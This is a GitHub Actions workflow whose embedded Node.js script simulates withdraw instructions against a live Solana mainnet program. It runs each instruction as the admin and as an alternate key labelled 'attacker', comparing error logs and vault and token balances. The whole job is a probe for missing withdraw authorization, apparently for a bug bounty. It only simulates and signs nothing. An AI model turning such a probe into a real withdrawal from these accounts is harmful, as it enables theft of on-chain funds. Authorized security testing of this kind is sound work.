name: mayhem-withdraw-auth-sim
on:
  push:
    branches: [audit/boost-runtime-probe-20260815]
    paths: ['.github/workflows/mayhem-withdraw-auth-sim.yml']
  workflow_dispatch:
permissions:
  contents: read
jobs:
  simulate:
    runs-on: ubuntu-24.04
    timeout-minutes: 12
    steps:
      - uses: actions/setup-node@v4
        with: {node-version: 24}
      - run: npm install --no-save @solana/web3.js @solana/spl-token
      - name: Simulation-only withdraw differential
        shell: bash
        run: |
          cat > x.mjs <<'NODE'
          import {PublicKey,Transaction,TransactionInstruction,SystemProgram} from '@solana/web3.js';
          import {getAssociatedTokenAddressSync,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID} from '@solana/spl-token';
          const MAY=new PublicKey('MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e'),GP=new PublicKey('13ec7XdrjF3h3YcqBTFDSReRcUFwbCnJaAQspM4j6DDJ'),SV=new PublicKey('BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s'),ADMIN=new PublicKey('FFWtrEQ4B4PKQoVuHYzZq8FabGkVatYzDpEVHsK5rrhF'),ALT=new PublicKey('39azUYFWPz3VHgKCf3VChUwbpURdCHRxjWVowf5jUJjg'),EA=new PublicKey('8FoNgzmjuSmiy86EPCWxvv1q7oJSu2WGA7wPymwki2LJ'),USDC=new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
          const DISC={sol:'1e1b87bc899eda6b',quote:'cc712a30723af859'};
          const RPCS=['https://api.mainnet-beta.solana.com','https://rpc.solanatracker.io/public','https://solana-rpc.publicnode.com'];let id=1;const sl=m=>new Promise(r=>setTimeout(r,m));async function q(u,m,p,n=5){let e;for(let i=0;i<n;i++){try{const r=await fetch(u,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method:m,params:p})});if(r.status===429||r.status>=500){e=Error('HTTP '+r.status);await sl(250+450*i);continue}const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result}catch(x){e=x;await sl(160)}}throw e}async function call(m,p){let e;for(const u of RPCS){try{return await q(u,m,p)}catch(x){e=x;console.log('RPCFAIL',m,u,String(x).slice(0,130))}}throw e}
          const svUsdc=getAssociatedTokenAddressSync(USDC,SV,true,TOKEN_PROGRAM_ID),adminUsdc=getAssociatedTokenAddressSync(USDC,ADMIN,true,TOKEN_PROGRAM_ID),altUsdc=getAssociatedTokenAddressSync(USDC,ALT,true,TOKEN_PROGRAM_ID);
          function data(kind,withAmount){const d=Buffer.from(DISC[kind],'hex');if(!withAmount)return d;const a=Buffer.alloc(8);a.writeBigUInt64LE(1n);return Buffer.concat([d,a])}
          function keys(kind,who){if(kind==='sol')return [{pubkey:who,isSigner:true,isWritable:true},{pubkey:GP,isSigner:false,isWritable:true},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},{pubkey:SV,isSigner:false,isWritable:true},{pubkey:EA,isSigner:false,isWritable:false},{pubkey:MAY,isSigner:false,isWritable:false}];const dest=who.equals(ADMIN)?adminUsdc:altUsdc;return [{pubkey:who,isSigner:true,isWritable:true},{pubkey:GP,isSigner:false,isWritable:true},{pubkey:SystemProgram.programId,isSigner:false,isWritable:false},{pubkey:SV,isSigner:false,isWritable:true},{pubkey:USDC,isSigner:false,isWritable:false},{pubkey:svUsdc,isSigner:false,isWritable:true},{pubkey:TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},{pubkey:ASSOCIATED_TOKEN_PROGRAM_ID,isSigner:false,isWritable:false},{pubkey:dest,isSigner:false,isWritable:true},{pubkey:EA,isSigner:false,isWritable:false},{pubkey:MAY,isSigner:false,isWritable:false}]}
          const watch=[GP,SV,ADMIN,ALT,svUsdc,adminUsdc,altUsdc];
          function amount(a){if(!a)return null;const b=Buffer.from(a.data[0],'base64');return b.length>=72?b.readBigUInt64LE(64).toString():null}
          async function sim(kind,who,withAmount){const ix=new TransactionInstruction({programId:MAY,keys:keys(kind,who),data:data(kind,withAmount)});const bh=(await call('getLatestBlockhash',[{commitment:'confirmed'}])).value.blockhash;const tx=new Transaction({feePayer:ALT,recentBlockhash:bh}).add(ix),raw=tx.serialize({requireAllSignatures:false,verifySignatures:false});let v,used;for(const u of RPCS){try{v=(await q(u,'simulateTransaction',[raw.toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'confirmed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}],3)).value;used=u;break}catch(e){console.log('SIMFAIL',kind,u,String(e).slice(0,130))}}if(!v)return {noSim:true};const logs=v.logs??[],snap=(v.accounts??[]).map((a,i)=>({address:watch[i].toBase58(),exists:!!a,owner:a?.owner??null,lamports:a?.lamports??null,tokenAmount:amount(a)}));const r={kind,who:who.toBase58(),withAmount,rpc:used,err:v.err,units:v.unitsConsumed,snapshot:snap,anchor:logs.filter(x=>/AnchorError|Error Code|Error Number/.test(x)),failed:logs.filter(x=>x.includes('failed:')),instructions:logs.filter(x=>x.includes('Instruction:')),interesting:logs.filter(x=>/Withdraw|Permission|Signer|rate|Rate|associated|token|vault/i.test(x))};console.log('RESULT',JSON.stringify(r,null,2));return r}
          for(const kind of ['sol','quote']){for(const withAmount of [false,true]){const c=await sim(kind,ADMIN,withAmount),a=await sim(kind,ALT,withAmount);console.log('PAIR',JSON.stringify({kind,withAmount,control:c,attacker:a},null,2));await sl(220)}}
          NODE
          node x.mjs
